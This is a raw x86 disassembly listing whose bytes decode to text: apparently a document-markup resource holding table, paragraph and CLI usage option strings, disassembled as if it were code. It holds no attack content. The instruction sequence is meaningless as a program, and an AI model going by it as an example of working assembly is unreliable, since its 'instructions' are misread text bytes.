1100aa75:	jns    0x1100aae3
1100aa77:	gs cmp eax,0x74537b22
1100aa7d:	popa   
1100aa7e:	je     0x1100aae9
1100aa80:	arpl   WORD PTR [edx+0x65],dx
1100aa83:	jae    0x1100aaf4
1100aa85:	jne    0x1100aaf9
1100aa87:	arpl   WORD PTR [ebp+0x20],sp
1100aa8a:	fs popa 
1100aa8c:	je     0x1100aaef
1100aa8e:	push   edx
1100aa8f:	outs   dx,DWORD PTR ds:[esi]
1100aa90:	ja     0x1100aae5
1100aa92:	je     0x1100ab0d
1100aa94:	ins    BYTE PTR es:[edi],dx
1100aa95:	gs jge 0x1100aaba
1100aa98:	ds or  eax,0x90a0d0a
1100aa9e:	or     DWORD PTR [eax],esp
1100aaa0:	and    BYTE PTR [esp+edx*2],bh
1100aaa3:	popa   
1100aaa4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100aaa8:	outs   dx,DWORD PTR ds:[esi]
1100aaa9:	ja     0x1100aae9
1100aaab:	or     eax,0x909090a
1100aab0:	and    BYTE PTR [eax],ah
1100aab2:	cmp    al,0x54
1100aab4:	popa   
1100aab5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100aab9:	gs ins BYTE PTR es:[edi],dx
1100aabb:	ins    BYTE PTR es:[edi],dx
1100aabc:	ds or  eax,0x909090a
1100aac2:	or     DWORD PTR [eax],esp
1100aac4:	and    BYTE PTR [eax+edx*2],bh
1100aac7:	popa   
1100aac8:	jb     0x1100ab2b
1100aaca:	addr16 jb 0x1100ab2e
1100aacd:	jo     0x1100ab37
1100aacf:	and    BYTE PTR [esi+0x6f],al
1100aad2:	jb     0x1100ab39
1100aad4:	addr16 jb 0x1100ab46
1100aad7:	jne    0x1100ab47
1100aad9:	fs cmp eax,0x756c4222
1100aadf:	and    bh,BYTE PTR gs:[esi]
1100aae2:	inc    ebx
1100aae3:	dec    esp
1100aae4:	dec    ecx
1100aae5:	pop    edi
1100aae6:	push   ebp
1100aae7:	push   ebx
1100aae8:	inc    ecx
1100aae9:	inc    edi
1100aaea:	inc    ebp
1100aaeb:	pop    edi
1100aaec:	inc    esp
1100aaed:	inc    ebp
1100aaee:	inc    edx
1100aaef:	push   ebp
1100aaf0:	inc    edi
1100aaf1:	pop    edi
1100aaf2:	dec    edi
1100aaf3:	push   eax
1100aaf4:	push   esp
1100aaf5:	dec    ecx
1100aaf6:	dec    edi
1100aaf7:	dec    esi
1100aaf8:	cmp    al,0x2f
1100aafa:	push   eax
1100aafb:	popa   
1100aafc:	jb     0x1100ab5f
1100aafe:	addr16 jb 0x1100ab62
1100ab01:	jo     0x1100ab6b
1100ab03:	ds or  eax,0x909090a
1100ab09:	and    BYTE PTR [eax],ah
1100ab0b:	cmp    al,0x2f
1100ab0d:	push   esp
1100ab0e:	popa   
1100ab0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ab13:	gs ins BYTE PTR es:[edi],dx
1100ab15:	ins    BYTE PTR es:[edi],dx
1100ab16:	ds or  eax,0x909090a
1100ab1c:	and    BYTE PTR [eax],ah
1100ab1e:	cmp    al,0x54
1100ab20:	popa   
1100ab21:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ab25:	gs ins BYTE PTR es:[edi],dx
1100ab27:	ins    BYTE PTR es:[edi],dx
1100ab28:	ds or  eax,0x909090a
1100ab2e:	or     DWORD PTR [eax],esp
1100ab30:	and    BYTE PTR [eax+edx*2],bh
1100ab33:	popa   
1100ab34:	jb     0x1100ab97
1100ab36:	addr16 jb 0x1100ab9a
1100ab39:	jo     0x1100aba3
1100ab3b:	ds inc ebx
1100ab3d:	dec    esp
1100ab3e:	dec    ecx
1100ab3f:	pop    edi
1100ab40:	push   ebp
1100ab41:	push   ebx
1100ab42:	inc    ecx
1100ab43:	inc    edi
1100ab44:	inc    ebp
1100ab45:	pop    edi
1100ab46:	inc    esp
1100ab47:	inc    ebp
1100ab48:	inc    edx
1100ab49:	push   ebp
1100ab4a:	inc    edi
1100ab4b:	pop    edi
1100ab4c:	dec    edi
1100ab4d:	push   eax
1100ab4e:	push   esp
1100ab4f:	dec    ecx
1100ab50:	dec    edi
1100ab51:	dec    esi
1100ab52:	pop    edi
1100ab53:	inc    esp
1100ab54:	inc    ebp
1100ab55:	push   ebx
1100ab56:	inc    ebx
1100ab57:	cmp    al,0x2f
1100ab59:	push   eax
1100ab5a:	popa   
1100ab5b:	jb     0x1100abbe
1100ab5d:	addr16 jb 0x1100abc1
1100ab60:	jo     0x1100abca
1100ab62:	ds or  eax,0x909090a
1100ab68:	and    BYTE PTR [eax],ah
1100ab6a:	cmp    al,0x2f
1100ab6c:	push   esp
1100ab6d:	popa   
1100ab6e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ab72:	gs ins BYTE PTR es:[edi],dx
1100ab74:	ins    BYTE PTR es:[edi],dx
1100ab75:	ds or  eax,0x2009090a
1100ab7b:	and    BYTE PTR [edi+ebp*1],bh
1100ab7e:	push   esp
1100ab7f:	popa   
1100ab80:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ab84:	outs   dx,DWORD PTR ds:[esi]
1100ab85:	ja     0x1100abc5
1100ab87:	or     eax,0x2020200a
1100ab8c:	and    BYTE PTR [eax],ah
1100ab8e:	and    BYTE PTR ds:0x2020200a,cl
1100ab94:	and    BYTE PTR [eax],ah
1100ab96:	and    BYTE PTR [esp+edx*2],bh
1100ab99:	popa   
1100ab9a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ab9e:	outs   dx,DWORD PTR ds:[esi]
1100ab9f:	ja     0x1100abdf
1100aba1:	or     eax,0x2020200a
1100aba6:	and    BYTE PTR [eax],ah
1100aba8:	and    BYTE PTR [eax],ah
1100abaa:	and    BYTE PTR [esp+edx*2],bh
1100abad:	popa   
1100abae:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100abb2:	gs ins BYTE PTR es:[edi],dx
1100abb4:	ins    BYTE PTR es:[edi],dx
1100abb5:	and    BYTE PTR [ebx+0x6f],al
1100abb8:	ins    BYTE PTR es:[edi],dx
1100abb9:	jne    0x1100ac28
1100abbb:	outs   dx,BYTE PTR ds:[esi]
1100abbc:	push   ebx
1100abbd:	jo     0x1100ac20
1100abbf:	outs   dx,BYTE PTR ds:[esi]
1100abc0:	cmp    eax,0x3e223222
1100abc5:	or     eax,0x2020200a
1100abca:	and    BYTE PTR [eax],ah
1100abcc:	and    BYTE PTR [eax],ah
1100abce:	and    BYTE PTR [edi+ebp*1],bh
1100abd1:	push   esp
1100abd2:	popa   
1100abd3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100abd7:	gs ins BYTE PTR es:[edi],dx
1100abd9:	ins    BYTE PTR es:[edi],dx
1100abda:	ds or  eax,0x2020200a
1100abe0:	and    BYTE PTR [eax],ah
1100abe2:	and    BYTE PTR [edi+ebp*1],bh
1100abe5:	push   esp
1100abe6:	popa   
1100abe7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100abeb:	outs   dx,DWORD PTR ds:[esi]
1100abec:	ja     0x1100ac2c
1100abee:	or     eax,0x2020090a
1100abf3:	cmp    al,0x2f
1100abf5:	push   esp
1100abf6:	popa   
1100abf7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100abfb:	outs   dx,DWORD PTR ds:[esi]
1100abfc:	ja     0x1100ac45
1100abfe:	jb     0x1100ac6f
1100ac00:	jne    0x1100ac72
1100ac02:	ds or  eax,0x200a0d0a
1100ac08:	and    BYTE PTR [eax],ah
1100ac0a:	and    BYTE PTR [esp+edx*2],bh
1100ac0d:	popa   
1100ac0e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ac12:	outs   dx,DWORD PTR ds:[esi]
1100ac13:	ja     0x1100ac5c
1100ac15:	jb     0x1100ac86
1100ac17:	jne    0x1100ac89
1100ac19:	and    BYTE PTR [ebx+0x74],dl
1100ac1c:	jns    0x1100ac8a
1100ac1e:	gs cmp eax,0x74537b22
1100ac24:	popa   
1100ac25:	je     0x1100ac90
1100ac27:	arpl   WORD PTR [edx+0x65],dx
1100ac2a:	jae    0x1100ac9b
1100ac2c:	jne    0x1100aca0
1100ac2e:	arpl   WORD PTR [ebp+0x20],sp
1100ac31:	push   0x65646165
1100ac36:	jb     0x1100ac7e
1100ac38:	outs   dx,DWORD PTR ds:[esi]
1100ac39:	outs   dx,DWORD PTR ds:[esi]
1100ac3a:	je     0x1100aca1
1100ac3c:	jb     0x1100ac90
1100ac3e:	outs   dx,DWORD PTR ds:[esi]
1100ac3f:	ja     0x1100ac94
1100ac41:	je     0x1100acbc
1100ac43:	ins    BYTE PTR es:[edi],dx
1100ac44:	gs jge 0x1100ac69
1100ac47:	ds or  eax,0x2020200a
1100ac4d:	and    BYTE PTR [eax],ah
1100ac4f:	and    BYTE PTR [esp+edx*2],bh
1100ac52:	popa   
1100ac53:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ac57:	outs   dx,DWORD PTR ds:[esi]
1100ac58:	ja     0x1100ac98
1100ac5a:	or     eax,0x2020200a
1100ac5f:	and    BYTE PTR [eax],ah
1100ac61:	and    BYTE PTR [eax],ah
1100ac63:	and    BYTE PTR [esp+edx*2],bh
1100ac66:	popa   
1100ac67:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ac6b:	gs ins BYTE PTR es:[edi],dx
1100ac6d:	ins    BYTE PTR es:[edi],dx
1100ac6e:	and    BYTE PTR [ebx+0x6f],al
1100ac71:	ins    BYTE PTR es:[edi],dx
1100ac72:	jne    0x1100ace1
1100ac74:	outs   dx,BYTE PTR ds:[esi]
1100ac75:	push   ebx
1100ac76:	jo     0x1100acd9
1100ac78:	outs   dx,BYTE PTR ds:[esi]
1100ac79:	cmp    eax,0x3e223222
1100ac7e:	or     eax,0x2020200a
1100ac83:	and    BYTE PTR [eax],ah
1100ac85:	and    BYTE PTR [eax],ah
1100ac87:	and    BYTE PTR [eax],ah
1100ac89:	and    BYTE PTR [eax+edx*2],bh
1100ac8c:	popa   
1100ac8d:	jb     0x1100acf0
1100ac8f:	addr16 jb 0x1100acf3
1100ac92:	jo     0x1100acfc
1100ac94:	ds inc ebx
1100ac96:	dec    esp
1100ac97:	dec    ecx
1100ac98:	pop    edi
1100ac99:	push   ebp
1100ac9a:	push   ebx
1100ac9b:	inc    ecx
1100ac9c:	inc    edi
1100ac9d:	inc    ebp
1100ac9e:	pop    edi
1100ac9f:	inc    ebp
1100aca0:	pop    eax
1100aca1:	push   esp
1100aca2:	pop    edi
1100aca3:	push   edx
1100aca4:	inc    ebp
1100aca5:	dec    esi
1100aca6:	inc    ecx
1100aca7:	dec    ebp
1100aca8:	dec    ecx
1100aca9:	dec    esi
1100acaa:	inc    edi
1100acab:	pop    edi
1100acac:	dec    edi
1100acad:	push   eax
1100acae:	push   esp
1100acaf:	dec    ecx
1100acb0:	dec    edi
1100acb1:	dec    esi
1100acb2:	push   ebx
1100acb3:	cmp    al,0x2f
1100acb5:	push   eax
1100acb6:	popa   
1100acb7:	jb     0x1100ad1a
1100acb9:	addr16 jb 0x1100ad1d
1100acbc:	jo     0x1100ad26
1100acbe:	ds or  eax,0x2020200a
1100acc4:	and    BYTE PTR [eax],ah
1100acc6:	and    BYTE PTR [eax],ah
1100acc8:	and    BYTE PTR [edi+ebp*1],bh
1100accb:	push   esp
1100accc:	popa   
1100accd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100acd1:	gs ins BYTE PTR es:[edi],dx
1100acd3:	ins    BYTE PTR es:[edi],dx
1100acd4:	ds or  eax,0x2020200a
1100acda:	and    BYTE PTR [eax],ah
1100acdc:	and    BYTE PTR [edi+ebp*1],bh
1100acdf:	push   esp
1100ace0:	popa   
1100ace1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ace5:	outs   dx,DWORD PTR ds:[esi]
1100ace6:	ja     0x1100ad26
1100ace8:	or     eax,0x2020200a
1100aced:	and    BYTE PTR [edi+ebp*1],bh
1100acf0:	push   esp
1100acf1:	popa   
1100acf2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100acf6:	outs   dx,DWORD PTR ds:[esi]
1100acf7:	ja     0x1100ad40
1100acf9:	jb     0x1100ad6a
1100acfb:	jne    0x1100ad6d
1100acfd:	ds or  eax,0x200a0d0a
1100ad03:	and    BYTE PTR [eax],ah
1100ad05:	and    BYTE PTR [esp+edx*2],bh
1100ad08:	popa   
1100ad09:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ad0d:	outs   dx,DWORD PTR ds:[esi]
1100ad0e:	ja     0x1100ad57
1100ad10:	jb     0x1100ad81
1100ad12:	jne    0x1100ad84
1100ad14:	and    BYTE PTR [ebx+0x74],dl
1100ad17:	jns    0x1100ad85
1100ad19:	gs cmp eax,0x74537b22
1100ad1f:	popa   
1100ad20:	je     0x1100ad8b
1100ad22:	arpl   WORD PTR [edx+0x65],dx
1100ad25:	jae    0x1100ad96
1100ad27:	jne    0x1100ad9b
1100ad29:	arpl   WORD PTR [ebp+0x20],sp
1100ad2c:	fs popa 
1100ad2e:	je     0x1100ad91
1100ad30:	push   edx
1100ad31:	outs   dx,DWORD PTR ds:[esi]
1100ad32:	ja     0x1100ad87
1100ad34:	je     0x1100adaf
1100ad36:	ins    BYTE PTR es:[edi],dx
1100ad37:	gs jge 0x1100ad5c
1100ad3a:	ds or  eax,0x2020200a
1100ad40:	and    BYTE PTR [eax],ah
1100ad42:	and    BYTE PTR [esp+edx*2],bh
1100ad45:	popa   
1100ad46:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ad4a:	outs   dx,DWORD PTR ds:[esi]
1100ad4b:	ja     0x1100ad8b
1100ad4d:	or     eax,0x2020200a
1100ad52:	and    BYTE PTR [eax],ah
1100ad54:	and    BYTE PTR [eax],ah
1100ad56:	and    BYTE PTR [esp+edx*2],bh
1100ad59:	popa   
1100ad5a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ad5e:	gs ins BYTE PTR es:[edi],dx
1100ad60:	ins    BYTE PTR es:[edi],dx
1100ad61:	ds or  eax,0x2020200a
1100ad67:	and    BYTE PTR [eax],ah
1100ad69:	and    BYTE PTR [eax],ah
1100ad6b:	and    BYTE PTR [eax],ah
1100ad6d:	and    BYTE PTR [eax+edx*2],bh
1100ad70:	popa   
1100ad71:	jb     0x1100add4
1100ad73:	addr16 jb 0x1100add7
1100ad76:	jo     0x1100ade0
1100ad78:	and    BYTE PTR [esi+0x6f],al
1100ad7b:	jb     0x1100ade2
1100ad7d:	addr16 jb 0x1100adef
1100ad80:	jne    0x1100adf0
1100ad82:	fs cmp eax,0x756c4222
1100ad88:	and    bh,BYTE PTR gs:[esi]
1100ad8b:	inc    ebx
1100ad8c:	dec    esp
1100ad8d:	dec    ecx
1100ad8e:	pop    edi
1100ad8f:	push   ebp
1100ad90:	push   ebx
1100ad91:	inc    ecx
1100ad92:	inc    edi
1100ad93:	inc    ebp
1100ad94:	pop    edi
1100ad95:	push   edx
1100ad96:	inc    ebp
1100ad97:	dec    esi
1100ad98:	inc    ecx
1100ad99:	dec    ebp
1100ad9a:	inc    ebp
1100ad9b:	pop    edi
1100ad9c:	dec    edi
1100ad9d:	push   eax
1100ad9e:	push   esp
1100ad9f:	dec    ecx
1100ada0:	dec    edi
1100ada1:	dec    esi
1100ada2:	cmp    al,0x2f
1100ada4:	push   eax
1100ada5:	popa   
1100ada6:	jb     0x1100ae09
1100ada8:	addr16 jb 0x1100ae0c
1100adab:	jo     0x1100ae15
1100adad:	ds or  eax,0x2020200a
1100adb3:	and    BYTE PTR [eax],ah
1100adb5:	and    BYTE PTR [eax],ah
1100adb7:	and    BYTE PTR [edi+ebp*1],bh
1100adba:	push   esp
1100adbb:	popa   
1100adbc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100adc0:	gs ins BYTE PTR es:[edi],dx
1100adc2:	ins    BYTE PTR es:[edi],dx
1100adc3:	ds or  eax,0x2020200a
1100adc9:	and    BYTE PTR [eax],ah
1100adcb:	and    BYTE PTR [eax],ah
1100adcd:	and    BYTE PTR [esp+edx*2],bh
1100add0:	popa   
1100add1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100add5:	gs ins BYTE PTR es:[edi],dx
1100add7:	ins    BYTE PTR es:[edi],dx
1100add8:	ds or  eax,0x2020200a
1100adde:	and    BYTE PTR [eax],ah
1100ade0:	and    BYTE PTR [eax],ah
1100ade2:	and    BYTE PTR [eax],ah
1100ade4:	and    BYTE PTR [eax+edx*2],bh
1100ade7:	popa   
1100ade8:	jb     0x1100ae4b
1100adea:	addr16 jb 0x1100ae4e
1100aded:	jo     0x1100ae57
1100adef:	ds inc ebx
1100adf1:	dec    esp
1100adf2:	dec    ecx
1100adf3:	pop    edi
1100adf4:	push   ebp
1100adf5:	push   ebx
1100adf6:	inc    ecx
1100adf7:	inc    edi
1100adf8:	inc    ebp
1100adf9:	pop    edi
1100adfa:	push   edx
1100adfb:	inc    ebp
1100adfc:	dec    esi
1100adfd:	inc    ecx
1100adfe:	dec    ebp
1100adff:	inc    ebp
1100ae00:	pop    edi
1100ae01:	dec    edi
1100ae02:	push   eax
1100ae03:	push   esp
1100ae04:	dec    ecx
1100ae05:	dec    edi
1100ae06:	dec    esi
1100ae07:	pop    edi
1100ae08:	inc    esp
1100ae09:	inc    ebp
1100ae0a:	push   ebx
1100ae0b:	inc    ebx
1100ae0c:	cmp    al,0x2f
1100ae0e:	push   eax
1100ae0f:	popa   
1100ae10:	jb     0x1100ae73
1100ae12:	addr16 jb 0x1100ae76
1100ae15:	jo     0x1100ae7f
1100ae17:	ds or  eax,0x2020200a
1100ae1d:	and    BYTE PTR [eax],ah
1100ae1f:	and    BYTE PTR [eax],ah
1100ae21:	and    BYTE PTR [edi+ebp*1],bh
1100ae24:	push   esp
1100ae25:	popa   
1100ae26:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ae2a:	gs ins BYTE PTR es:[edi],dx
1100ae2c:	ins    BYTE PTR es:[edi],dx
1100ae2d:	ds or  eax,0x2020200a
1100ae33:	and    BYTE PTR [eax],ah
1100ae35:	and    BYTE PTR [edi+ebp*1],bh
1100ae38:	push   esp
1100ae39:	popa   
1100ae3a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ae3e:	outs   dx,DWORD PTR ds:[esi]
1100ae3f:	ja     0x1100ae7f
1100ae41:	or     eax,0x200a0d0a
1100ae46:	and    BYTE PTR [eax],ah
1100ae48:	and    BYTE PTR [eax],ah
1100ae4a:	and    BYTE PTR [esp+edx*2],bh
1100ae4d:	popa   
1100ae4e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100ae52:	outs   dx,DWORD PTR ds:[esi]
1100ae53:	ja     0x1100ae93
1100ae55:	or     eax,0x2020200a
1100ae5a:	and    BYTE PTR [eax],ah
1100ae5c:	and    BYTE PTR [eax],ah
1100ae5e:	and    BYTE PTR [esp+edx*2],bh
1100ae61:	popa   
1100ae62:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100ae66:	gs ins BYTE PTR es:[edi],dx
1100ae68:	ins    BYTE PTR es:[edi],dx
1100ae69:	ds or  eax,0x2020200a
1100ae6f:	and    BYTE PTR [eax],ah
1100ae71:	and    BYTE PTR [eax],ah
1100ae73:	and    BYTE PTR [eax],ah
1100ae75:	and    BYTE PTR [eax+edx*2],bh
1100ae78:	popa   
1100ae79:	jb     0x1100aedc
1100ae7b:	addr16 jb 0x1100aedf
1100ae7e:	jo     0x1100aee8
1100ae80:	and    BYTE PTR [esi+0x6f],al
1100ae83:	jb     0x1100aeea
1100ae85:	addr16 jb 0x1100aef7
1100ae88:	jne    0x1100aef8
1100ae8a:	fs cmp eax,0x756c4222
1100ae90:	and    bh,BYTE PTR gs:[esi]
1100ae93:	inc    ebx
1100ae94:	dec    esp
1100ae95:	dec    ecx
1100ae96:	pop    edi
1100ae97:	push   ebp
1100ae98:	push   ebx
1100ae99:	inc    ecx
1100ae9a:	inc    edi
1100ae9b:	inc    ebp
1100ae9c:	pop    edi
1100ae9d:	dec    ebp
1100ae9e:	inc    ecx
1100ae9f:	push   eax
1100aea0:	dec    edi
1100aea1:	push   ebp
1100aea2:	push   esp
1100aea3:	pop    edi
1100aea4:	dec    edi
1100aea5:	push   eax
1100aea6:	push   esp
1100aea7:	dec    ecx
1100aea8:	dec    edi
1100aea9:	dec    esi
1100aeaa:	cmp    al,0x2f
1100aeac:	push   eax
1100aead:	popa   
1100aeae:	jb     0x1100af11
1100aeb0:	addr16 jb 0x1100af14
1100aeb3:	jo     0x1100af1d
1100aeb5:	ds or  eax,0x2020200a
1100aebb:	and    BYTE PTR [eax],ah
1100aebd:	and    BYTE PTR [eax],ah
1100aebf:	and    BYTE PTR [edi+ebp*1],bh
1100aec2:	push   esp
1100aec3:	popa   
1100aec4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100aec8:	gs ins BYTE PTR es:[edi],dx
1100aeca:	ins    BYTE PTR es:[edi],dx
1100aecb:	ds or  eax,0x2020200a
1100aed1:	and    BYTE PTR [eax],ah
1100aed3:	and    BYTE PTR [eax],ah
1100aed5:	and    BYTE PTR [esp+edx*2],bh
1100aed8:	popa   
1100aed9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100aedd:	gs ins BYTE PTR es:[edi],dx
1100aedf:	ins    BYTE PTR es:[edi],dx
1100aee0:	ds or  eax,0x2020200a
1100aee6:	and    BYTE PTR [eax],ah
1100aee8:	and    BYTE PTR [eax],ah
1100aeea:	and    BYTE PTR [eax],ah
1100aeec:	and    BYTE PTR [eax+edx*2],bh
1100aeef:	popa   
1100aef0:	jb     0x1100af53
1100aef2:	addr16 jb 0x1100af56
1100aef5:	jo     0x1100af5f
1100aef7:	ds inc ebx
1100aef9:	dec    esp
1100aefa:	dec    ecx
1100aefb:	pop    edi
1100aefc:	push   ebp
1100aefd:	push   ebx
1100aefe:	inc    ecx
1100aeff:	inc    edi
1100af00:	inc    ebp
1100af01:	pop    edi
1100af02:	dec    ebp
1100af03:	inc    ecx
1100af04:	push   eax
1100af05:	dec    edi
1100af06:	push   ebp
1100af07:	push   esp
1100af08:	pop    edi
1100af09:	dec    edi
1100af0a:	push   eax
1100af0b:	push   esp
1100af0c:	dec    ecx
1100af0d:	dec    edi
1100af0e:	dec    esi
1100af0f:	pop    edi
1100af10:	inc    esp
1100af11:	inc    ebp
1100af12:	push   ebx
1100af13:	inc    ebx
1100af14:	cmp    al,0x2f
1100af16:	push   eax
1100af17:	popa   
1100af18:	jb     0x1100af7b
1100af1a:	addr16 jb 0x1100af7e
1100af1d:	jo     0x1100af87
1100af1f:	ds or  eax,0x2020200a
1100af25:	and    BYTE PTR [eax],ah
1100af27:	and    BYTE PTR [eax],ah
1100af29:	and    BYTE PTR [edi+ebp*1],bh
1100af2c:	push   esp
1100af2d:	popa   
1100af2e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100af32:	gs ins BYTE PTR es:[edi],dx
1100af34:	ins    BYTE PTR es:[edi],dx
1100af35:	ds or  eax,0x2020200a
1100af3b:	and    BYTE PTR [eax],ah
1100af3d:	and    BYTE PTR [edi+ebp*1],bh
1100af40:	push   esp
1100af41:	popa   
1100af42:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100af46:	outs   dx,DWORD PTR ds:[esi]
1100af47:	ja     0x1100af87
1100af49:	or     eax,0x200a0d0a
1100af4e:	and    BYTE PTR [eax],ah
1100af50:	and    BYTE PTR [eax],ah
1100af52:	and    BYTE PTR [esp+edx*2],bh
1100af55:	popa   
1100af56:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100af5a:	outs   dx,DWORD PTR ds:[esi]
1100af5b:	ja     0x1100af9b
1100af5d:	or     eax,0x2020200a
1100af62:	and    BYTE PTR [eax],ah
1100af64:	and    BYTE PTR [eax],ah
1100af66:	and    BYTE PTR [esp+edx*2],bh
1100af69:	popa   
1100af6a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100af6e:	gs ins BYTE PTR es:[edi],dx
1100af70:	ins    BYTE PTR es:[edi],dx
1100af71:	ds or  eax,0x2020200a
1100af77:	and    BYTE PTR [eax],ah
1100af79:	and    BYTE PTR [eax],ah
1100af7b:	and    BYTE PTR [eax],ah
1100af7d:	and    BYTE PTR [eax+edx*2],bh
1100af80:	popa   
1100af81:	jb     0x1100afe4
1100af83:	addr16 jb 0x1100afe7
1100af86:	jo     0x1100aff0
1100af88:	and    BYTE PTR [esi+0x6f],al
1100af8b:	jb     0x1100aff2
1100af8d:	addr16 jb 0x1100afff
1100af90:	jne    0x1100b000
1100af92:	fs cmp eax,0x756c4222
1100af98:	and    bh,BYTE PTR gs:[esi]
1100af9b:	inc    ebx
1100af9c:	dec    esp
1100af9d:	dec    ecx
1100af9e:	pop    edi
1100af9f:	push   ebp
1100afa0:	push   ebx
1100afa1:	inc    ecx
1100afa2:	inc    edi
1100afa3:	inc    ebp
1100afa4:	pop    edi
1100afa5:	inc    ebx
1100afa6:	dec    esp
1100afa7:	dec    edi
1100afa8:	inc    edx
1100afa9:	inc    edx
1100afaa:	inc    ebp
1100afab:	push   edx
1100afac:	dec    ebp
1100afad:	inc    ecx
1100afae:	push   eax
1100afaf:	pop    edi
1100afb0:	dec    edi
1100afb1:	push   eax
1100afb2:	push   esp
1100afb3:	dec    ecx
1100afb4:	dec    edi
1100afb5:	dec    esi
1100afb6:	cmp    al,0x2f
1100afb8:	push   eax
1100afb9:	popa   
1100afba:	jb     0x1100b01d
1100afbc:	addr16 jb 0x1100b020
1100afbf:	jo     0x1100b029
1100afc1:	ds or  eax,0x2020200a
1100afc7:	and    BYTE PTR [eax],ah
1100afc9:	and    BYTE PTR [eax],ah
1100afcb:	and    BYTE PTR [edi+ebp*1],bh
1100afce:	push   esp
1100afcf:	popa   
1100afd0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100afd4:	gs ins BYTE PTR es:[edi],dx
1100afd6:	ins    BYTE PTR es:[edi],dx
1100afd7:	ds or  eax,0x2020200a
1100afdd:	and    BYTE PTR [eax],ah
1100afdf:	and    BYTE PTR [eax],ah
1100afe1:	and    BYTE PTR [esp+edx*2],bh
1100afe4:	popa   
1100afe5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100afe9:	gs ins BYTE PTR es:[edi],dx
1100afeb:	ins    BYTE PTR es:[edi],dx
1100afec:	ds or  eax,0x2020200a
1100aff2:	and    BYTE PTR [eax],ah
1100aff4:	and    BYTE PTR [eax],ah
1100aff6:	and    BYTE PTR [eax],ah
1100aff8:	and    BYTE PTR [eax+edx*2],bh
1100affb:	popa   
1100affc:	jb     0x1100b05f
1100affe:	addr16 jb 0x1100b062
1100b001:	jo     0x1100b06b
1100b003:	ds inc ebx
1100b005:	dec    esp
1100b006:	dec    ecx
1100b007:	pop    edi
1100b008:	push   ebp
1100b009:	push   ebx
1100b00a:	inc    ecx
1100b00b:	inc    edi
1100b00c:	inc    ebp
1100b00d:	pop    edi
1100b00e:	inc    ebx
1100b00f:	dec    esp
1100b010:	dec    edi
1100b011:	inc    edx
1100b012:	inc    edx
1100b013:	inc    ebp
1100b014:	push   edx
1100b015:	dec    ebp
1100b016:	inc    ecx
1100b017:	push   eax
1100b018:	pop    edi
1100b019:	dec    edi
1100b01a:	push   eax
1100b01b:	push   esp
1100b01c:	dec    ecx
1100b01d:	dec    edi
1100b01e:	dec    esi
1100b01f:	pop    edi
1100b020:	inc    esp
1100b021:	inc    ebp
1100b022:	push   ebx
1100b023:	inc    ebx
1100b024:	cmp    al,0x2f
1100b026:	push   eax
1100b027:	popa   
1100b028:	jb     0x1100b08b
1100b02a:	addr16 jb 0x1100b08e
1100b02d:	jo     0x1100b097
1100b02f:	ds or  eax,0x2020200a
1100b035:	and    BYTE PTR [eax],ah
1100b037:	and    BYTE PTR [eax],ah
1100b039:	and    BYTE PTR [edi+ebp*1],bh
1100b03c:	push   esp
1100b03d:	popa   
1100b03e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b042:	gs ins BYTE PTR es:[edi],dx
1100b044:	ins    BYTE PTR es:[edi],dx
1100b045:	ds or  eax,0x2020200a
1100b04b:	and    BYTE PTR [eax],ah
1100b04d:	and    BYTE PTR [edi+ebp*1],bh
1100b050:	push   esp
1100b051:	popa   
1100b052:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b056:	outs   dx,DWORD PTR ds:[esi]
1100b057:	ja     0x1100b097
1100b059:	or     eax,0x200a0d0a
1100b05e:	and    BYTE PTR [eax],ah
1100b060:	and    BYTE PTR [eax],ah
1100b062:	and    BYTE PTR [esp+edx*2],bh
1100b065:	popa   
1100b066:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b06a:	outs   dx,DWORD PTR ds:[esi]
1100b06b:	ja     0x1100b0ab
1100b06d:	or     eax,0x2020200a
1100b072:	and    BYTE PTR [eax],ah
1100b074:	and    BYTE PTR [eax],ah
1100b076:	and    BYTE PTR [esp+edx*2],bh
1100b079:	popa   
1100b07a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b07e:	gs ins BYTE PTR es:[edi],dx
1100b080:	ins    BYTE PTR es:[edi],dx
1100b081:	ds or  eax,0x2020200a
1100b087:	and    BYTE PTR [eax],ah
1100b089:	and    BYTE PTR [eax],ah
1100b08b:	and    BYTE PTR [eax],ah
1100b08d:	and    BYTE PTR [eax+edx*2],bh
1100b090:	popa   
1100b091:	jb     0x1100b0f4
